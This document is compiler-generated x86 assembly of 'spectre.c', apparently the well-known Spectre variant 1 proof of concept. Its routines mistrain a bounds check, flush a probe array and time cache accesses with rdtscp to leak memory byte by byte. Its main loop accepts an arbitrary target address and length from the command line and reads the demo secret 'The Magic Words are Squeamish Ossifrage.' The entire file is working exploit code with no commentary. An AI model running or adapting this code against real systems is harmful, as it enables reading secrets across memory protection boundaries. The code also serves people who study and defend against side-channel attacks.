	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	4(%esp), %eax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.globl	test
	.type	test, @function
test:
.LFB5563:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	pushl	%ebx
	.cfi_def_cfa_offset 8
	.cfi_offset 3, -8
	movl	8(%esp), %edx
	movl	12(%esp), %ecx
	movl	array1_size@GOTOFF(%eax), %ebx
	cmpl	%edx, %ebx
	jbe	.L3
	cmpb	%cl, array1@GOTOFF(%eax,%edx)
	je	.L6
.L3:
	popl	%ebx
	.cfi_remember_state
	.cfi_restore 3
	.cfi_def_cfa_offset 4
	ret
	.p2align 4,,10
	.p2align 3
.L6:
	.cfi_restore_state
	movzbl	%cl, %ecx
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 4
	movzbl	array2@GOTOFF(%eax,%ecx), %edx
	andb	%dl, temp@GOTOFF(%eax)
	ret
	.cfi_endproc
.LFE5563:
	.size	test, .-test
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5564:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movzbl	check_value@GOTOFF(%eax), %eax
	pushl	%eax
	.cfi_def_cfa_offset 8
	pushl	8(%esp)
	.cfi_def_cfa_offset 12
	call	test
	popl	%eax
	.cfi_def_cfa_offset 8
	popl	%edx
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5564:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5565:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	$256, %ecx
	pushl	%edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	pushl	%esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	call	__x86.get_pc_thunk.si
	addl	$_GLOBAL_OFFSET_TABLE_, %esi
	pushl	%ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	subl	$92, %esp
	.cfi_def_cfa_offset 112
	movl	116(%esp), %eax
	movl	%eax, 56(%esp)
	movl	120(%esp), %eax
	leal	results.0@GOTOFF(%esi), %edi
	movl	%eax, 60(%esp)
	movl	%gs:20, %eax
	movl	%eax, 76(%esp)
	xorl	%eax, %eax
	movl	%edi, 40(%esp)
	movl	$0, 68(%esp)
	movl	$999, 52(%esp)
	rep stosl
	leal	68(%esp), %eax
	leal	array1_size@GOTOFF(%esi), %edi
	movl	%eax, 48(%esp)
	leal	array2@GOTOFF(%esi), %eax
	movl	%edi, %ebp
	movl	%eax, 44(%esp)
.L9:
	movl	44(%esp), %ecx
	movl	%ecx, %eax
	leal	131072(%ecx), %edx
.L10:
	clflush	(%eax)
	addl	$512, %eax
	cmpl	%edx, %eax
	jne	.L10
	movl	52(%esp), %eax
	movl	array1_size@GOTOFF(%esi), %ecx
	movl	$0, 16(%esp)
	cltd
	idivl	%ecx
	movl	112(%esp), %eax
	xorl	%edx, %eax
	movl	%edx, %edi
	movl	%eax, 12(%esp)
.L16:
	movzbl	16(%esp), %eax
	movl	$29, %ebx
	movb	%al, check_value@GOTOFF(%esi)
	movl	%ebp, %eax
	movl	%edi, %ebp
	movl	%eax, %edi
	.p2align 4,,10
	.p2align 3
.L12:
	clflush	(%edi)
	movl	$0, 72(%esp)
	movl	72(%esp), %eax
	cmpl	$99, %eax
	jg	.L14
	.p2align 4,,10
	.p2align 3
.L11:
	movl	72(%esp), %eax
	addl	$1, %eax
	movl	%eax, 72(%esp)
	movl	72(%esp), %eax
	cmpl	$99, %eax
	jle	.L11
.L14:
	movl	$-1431655765, %eax
	mull	%ebx
	movl	%ebx, %eax
	subl	$1, %ebx
	shrl	$2, %edx
	leal	(%edx,%edx,2), %edx
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	movl	%eax, %edx
	shrl	$16, %eax
	xorw	%dx, %dx
	orl	%edx, %eax
	movzbl	check_value@GOTOFF(%esi), %edx
	andl	12(%esp), %eax
	xorl	%ebp, %eax
	pushl	%edx
	.cfi_def_cfa_offset 116
	pushl	%eax
	.cfi_def_cfa_offset 120
	call	test
	popl	%eax
	.cfi_def_cfa_offset 116
	popl	%edx
	.cfi_def_cfa_offset 112
	cmpl	$-1, %ebx
	jne	.L12
	movl	%edi, %eax
	movl	%ebp, %edi
	movl	%eax, %ebp
	rdtscp
	movl	%eax, 24(%esp)
	movl	48(%esp), %eax
	movl	%edx, 28(%esp)
	movl	%eax, 20(%esp)
	movl	%ecx, (%eax)
	movl	44(%esp), %eax
	movl	16(%esp), %ecx
	movzbl	(%eax,%ecx), %eax
	rdtscp
	movl	%edx, 36(%esp)
	movl	20(%esp), %edx
	movl	%eax, 32(%esp)
	movl	$50, %eax
	movl	%ecx, (%edx)
	movl	32(%esp), %edx
	subl	24(%esp), %edx
	movl	36(%esp), %ecx
	sbbl	28(%esp), %ecx
	cmpl	%edx, %eax
	movl	$0, %eax
	sbbl	%ecx, %eax
	jc	.L15
	movl	16(%esp), %ecx
	addl	$1, results.0@GOTOFF(%esi,%ecx,4)
.L15:
	addl	$1, 16(%esp)
	movl	16(%esp), %eax
	cmpl	$256, %eax
	jne	.L16
	xorl	%eax, %eax
	xorl	%ecx, %ecx
.L17:
	movl	40(%esp), %edi
	addl	$1, %eax
	movl	(%edi,%ecx,4), %edx
	cmpl	$256, %eax
	je	.L41
	movl	results.0@GOTOFF(%esi,%eax,4), %edi
	cmpl	%edx, %edi
	jge	.L23
	cmpl	$-1, %ebx
	je	.L24
	movl	40(%esp), %edx
	cmpl	(%edx,%ebx,4), %edi
	cmovge	%eax, %ebx
	jmp	.L17
.L23:
	movl	%ecx, %ebx
	movl	%eax, %ecx
	jmp	.L17
.L24:
	movl	%eax, %ebx
	jmp	.L17
.L41:
	movl	(%edi,%ebx,4), %eax
	leal	4(%eax,%eax), %edi
	cmpl	%edx, %edi
	jl	.L20
	cmpl	$2, %edx
	jne	.L25
	testl	%eax, %eax
	je	.L20
.L25:
	subl	$1, 52(%esp)
	jne	.L9
.L20:
	movl	results.0@GOTOFF(%esi), %eax
	xorl	68(%esp), %eax
	movl	%ebx, %ebp
	movl	%ecx, %ebx
	movl	56(%esp), %ecx
	movl	60(%esp), %edi
	movl	%eax, results.0@GOTOFF(%esi)
	movl	40(%esp), %esi
	movb	%bl, (%ecx)
	movl	(%esi,%ebx,4), %eax
	movl	%eax, (%edi)
	movl	%ebp, %eax
	movb	%al, 1(%ecx)
	movl	(%esi,%ebp,4), %eax
	movl	%eax, 4(%edi)
	movl	76(%esp), %eax
	subl	%gs:20, %eax
	jne	.L42
	addl	$92, %esp
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L42:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5566:
	.cfi_startproc
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	subl	$104, %esp
	movl	(%ecx), %eax
	movl	%eax, -104(%ebp)
	movl	4(%ecx), %eax
	movl	%eax, -116(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	movl	stdin@GOT(%ebx), %eax
	movl	%eax, -68(%ebp)
	leal	check@GOTOFF(%ebx), %eax
	movl	%eax, -112(%ebp)
	sarl	$31, %eax
	movl	%eax, -108(%ebp)
	.p2align 4,,10
	.p2align 3
.L44:
	movl	-68(%ebp), %eax
	subl	$12, %esp
	pushl	(%eax)
	call	getc@PLT
	addl	$16, %esp
	cmpb	$114, %al
	je	.L62
	cmpb	$10, %al
	je	.L44
	cmpb	$105, %al
	jne	.L54
	call	getpid@PLT
	subl	$12, %esp
	movl	-108(%ebp), %edx
	pushl	%eax
	movl	-112(%ebp), %eax
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%edx
	pushl	%eax
	leal	.LC12@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L44
.L62:
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %edi
	pushl	%eax
	pushl	%eax
	leal	.LC2@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	secret@GOTOFF(%ebx), %eax
	movl	%eax, %edx
	movl	%eax, (%esp)
	subl	%edi, %edx
	movl	%edx, -48(%ebp)
	call	strlen@PLT
	addl	$12, %esp
	movb	$1, check_value@GOTOFF(%ebx)
	movl	%eax, -44(%ebp)
	movl	%eax, %esi
	leal	array2@GOTOFF(%ebx), %eax
	pushl	$131072
	pushl	$1
	pushl	%eax
	call	memset@PLT
	addl	$16, %esp
	cmpl	$3, -104(%ebp)
	je	.L63
.L46:
	subl	$4, %esp
	leal	.LC6@GOTOFF(%ebx), %eax
	pushl	%esi
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	addl	$16, %esp
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	testl	%eax, %eax
	js	.L44
	leal	.LC7@GOTOFF(%ebx), %eax
	movl	$0, -60(%ebp)
	movl	%eax, -80(%ebp)
	leal	-40(%ebp), %eax
	movl	%eax, -72(%ebp)
	leal	-30(%ebp), %eax
	movl	%eax, -76(%ebp)
	leal	.LC8@GOTOFF(%ebx), %eax
	movl	%eax, -84(%ebp)
	leal	.LC9@GOTOFF(%ebx), %eax
	movl	%eax, -92(%ebp)
	leal	.LC11@GOTOFF(%ebx), %eax
	movl	%eax, -88(%ebp)
	leal	.LC1@GOTOFF(%ebx), %eax
	movl	%eax, -100(%ebp)
	leal	.LC0@GOTOFF(%ebx), %eax
	movl	%eax, -96(%ebp)
	.p2align 4,,10
	.p2align 3
.L47:
	movl	-60(%ebp), %edi
	movl	secret@GOTOFF(%ebx), %eax
	movl	$63, %esi
	movsbl	(%eax,%edi), %eax
	addl	$1, %edi
	pushl	%eax
	pushl	-48(%ebp)
	pushl	-80(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movl	-48(%ebp), %eax
	addl	$12, %esp
	pushl	-72(%ebp)
	pushl	-76(%ebp)
	pushl	%eax
	leal	1(%eax), %edx
	movl	%edi, -60(%ebp)
	movl	%edx, -48(%ebp)
	call	readMemoryByte
	movl	-36(%ebp), %edi
	movl	-40(%ebp), %edx
	addl	$12, %esp
	leal	(%edi,%edi), %eax
	movl	%edx, -64(%ebp)
	cmpl	%eax, %edx
	movl	-100(%ebp), %eax
	cmovge	-96(%ebp), %eax
	pushl	%eax
	pushl	-84(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movzbl	-30(%ebp), %ecx
	movl	-64(%ebp), %edx
	movl	%ecx, %eax
	movl	%edx, (%esp)
	subl	$32, %eax
	cmpb	$95, %al
	movl	%esi, %eax
	cmovb	%ecx, %eax
	pushl	%eax
	pushl	%ecx
	pushl	-92(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	testl	%edi, %edi
	jle	.L51
	movzbl	-29(%ebp), %edx
	movl	%edx, %eax
	subl	$32, %eax
	cmpb	$95, %al
	leal	.LC10@GOTOFF(%ebx), %eax
	cmovb	%edx, %esi
	subl	$12, %esp
	pushl	%edi
	pushl	%esi
	pushl	%edx
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
.L51:
	subl	$8, %esp
	pushl	-88(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	addl	$16, %esp
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	testl	%eax, %eax
	jns	.L47
	jmp	.L44
.L54:
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	jne	.L64
	leal	-16(%ebp), %esp
	xorl	%eax, %eax
	popl	%ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
.L63:
	.cfi_restore_state
	movl	-116(%ebp), %esi
	pushl	%eax
	leal	-48(%ebp), %eax
	pushl	%eax
	leal	.LC3@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	4(%esi)
	call	__isoc99_sscanf@PLT
	addl	$12, %esp
	leal	-44(%ebp), %eax
	subl	%edi, -48(%ebp)
	pushl	%eax
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	8(%esi)
	call	__isoc99_sscanf@PLT
	leal	.LC5@GOTOFF(%ebx), %eax
	pushl	-44(%ebp)
	pushl	-48(%ebp)
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %esi
	addl	$32, %esp
	jmp	.L46
.L64:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5566:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	check_value
	.data
	.type	check_value, @object
	.size	check_value, 1
check_value:
	.byte	1
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5567:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5568:
	.cfi_startproc
	movl	(%esp), %ebx
	ret
	.cfi_endproc
.LFE5568:
	.section	.text.__x86.get_pc_thunk.si,"axG",@progbits,__x86.get_pc_thunk.si,comdat
	.globl	__x86.get_pc_thunk.si
	.hidden	__x86.get_pc_thunk.si
	.type	__x86.get_pc_thunk.si, @function
__x86.get_pc_thunk.si:
.LFB5569:
	.cfi_startproc
	movl	(%esp), %esi
	ret
	.cfi_endproc
.LFE5569:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
